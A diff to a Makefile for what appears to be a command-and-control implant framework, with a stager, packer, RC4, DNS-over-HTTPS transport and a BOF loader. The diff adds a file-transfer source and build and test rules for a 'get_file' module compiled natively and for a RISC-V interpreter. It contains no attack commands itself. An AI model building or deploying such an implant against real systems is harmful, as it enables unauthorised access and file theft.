@@ -229,6 +229,7 @@ PORTABLE_SRC = src/util/rc4.c src/util/packer.c src/util/dynload.c src/util/dynl
                src/util/debug.c src/common.c src/crypto.c \
                src/messages.c src/agent_info.c src/config.c \
                src/secureconn.c src/session.c src/memfile.c src/bof_host.c \
+               src/file_transfer.c \
                src/sysinfo.c src/agent_identity.c src/stager_iface.c \
                $(BOF_SRC) $(RVVM_SRC) $(MODULE_SUPPORT_SRC) $(DOH_SRC) \
                $(GZIP_SRC) $(CRYPTO_SRC) $(TRANSPORT_SRC) $(TRANSPORT_SUPPORT_SRC) \
@@ -285,7 +286,7 @@ CONFIG_SRC ?=
 AGENT_COMMON_SRC = src/agent_args.c src/util/dynload.c src/util/dynload_hosted.c \
                    src/crypto.c src/messages.c src/common.c \
                    src/agent_info.c src/config.c src/secureconn.c \
-                   src/session.c src/memfile.c src/bof_host.c \
+                   src/session.c src/memfile.c src/bof_host.c src/file_transfer.c \
                    src/sysinfo.c \
                    src/agent_identity.c src/stager_iface.c
 TINYCBOR_MIN_SRC = vendor/tinycbor/cborencoder.c vendor/tinycbor/cborparser.c
@@ -353,9 +354,13 @@ endif
 # runner. Skipped when the module sources are absent (standalone checkout).
 BOF_MODULE_DIR = ../modules/coffloader_linux
 BOF_HELLO_DIR = ../modules/hello_linux
+XFER_BOF_DIR = ../modules/file_transfer_bof
 ifneq ($(wildcard $(BOF_MODULE_DIR)/loader_linux.c),)
   BOF_TEST = $(BUILD)/test_bof $(BUILD)/test_elfload
   BOF_FUZZ = $(BUILD)/fuzz_bof
+endif
+ifneq ($(wildcard $(XFER_BOF_DIR)/file_transfer_bof.c),)
+  XFER_BOF_TEST = $(BUILD)/test_file_transfer_bof
 endif
 
 # RV32 interpreter test: build the real rvvm_linux module and the guest
@@ -386,7 +391,7 @@ test: $(BUILD)/test_strings $(BUILD)/test_rc4 $(BUILD)/test_packer \
       $(BUILD)/test_sysinfo $(BUILD)/test_module \
       $(BUILD)/test_secureconn $(BUILD)/test_identity \
       $(BUILD)/test_stager_iface \
-      $(GZIP_TEST) $(BOF_TEST) $(RVVM_TEST) \
+      $(GZIP_TEST) $(BOF_TEST) $(XFER_BOF_TEST) $(RVVM_TEST) \
       $(BUILD)/test_crypto_openssl
 	@set -e; for t in $^; do echo "--- $$t"; ./$$t; done
 
@@ -487,6 +492,36 @@ $(BUILD)/test_bof: tests/test_bof.c src/bof.c src/bof_args.c src/util/dynload.c 
 	  -DBOF_OBJ_PATH='"$(BUILD)/hello_linux.o"' \
 	  tests/test_bof.c src/bof.c src/bof_args.c src/util/dynload.c \
 	  src/util/elfload.c -o $@
+
+$(BUILD)/get_file.o: $(XFER_BOF_DIR)/file_transfer_bof.c | $(BUILD)
+	$(MAKE) -C $(XFER_BOF_DIR) get_file.o >/dev/null
+	cp $(XFER_BOF_DIR)/get_file.o $@
+	$(MAKE) -C $(XFER_BOF_DIR) clean >/dev/null
+
+$(BUILD)/get_file.rv.o: $(XFER_BOF_DIR)/file_transfer_bof.c | $(BUILD)
+	$(MAKE) -C $(XFER_BOF_DIR) get_file.rv.o >/dev/null
+	cp $(XFER_BOF_DIR)/get_file.rv.o $@
+	$(MAKE) -C $(XFER_BOF_DIR) clean >/dev/null
+
+$(BUILD)/get_file.rv: $(BUILD)/get_file.rv.o $(RVVM_GUEST_DIR)/main.c \
+                     $(RVVM_GUEST_DIR)/guest.ld | $(BUILD)
+	$(ZIG) build-exe -target riscv32-linux-musl -mcpu=generic_rv32+a \
+	  -static -O ReleaseSmall -fno-entry -fstrip -lc \
+	  -T $(RVVM_GUEST_DIR)/guest.ld $(RVVM_GUEST_DIR)/main.c \
+	  $< -femit-bin=$@
+
+$(BUILD)/test_file_transfer_bof: tests/test_file_transfer_bof.c src/bof.c \
+                                 src/bof_args.c src/rvvm.c src/util/dynload.c \
+                                 src/util/elfload.c $(BUILD)/coffloader_linux.so \
+                                 $(BUILD)/rvvm_linux.so $(BUILD)/get_file.o \
+                                 $(BUILD)/get_file.rv tests/test.h | $(BUILD)
+	$(HOSTCC) $(TEST_CFLAGS) \
+	  -DBOF_LOADER_PATH='"$(BUILD)/coffloader_linux.so"' \
+	  -DBOF_GET_PATH='"$(BUILD)/get_file.o"' \
+	  -DRVVM_LOADER_PATH='"$(BUILD)/rvvm_linux.so"' \
+	  -DRV_GET_PATH='"$(BUILD)/get_file.rv"' \
+	  tests/test_file_transfer_bof.c src/bof.c src/bof_args.c src/rvvm.c \
+	  src/util/dynload.c src/util/elfload.c -o $@
 
 $(BUILD)/test_elfload: tests/test_elfload.c src/util/elfload.c \
                           src/util/dynload.c $(BUILD)/coffloader_linux.so \
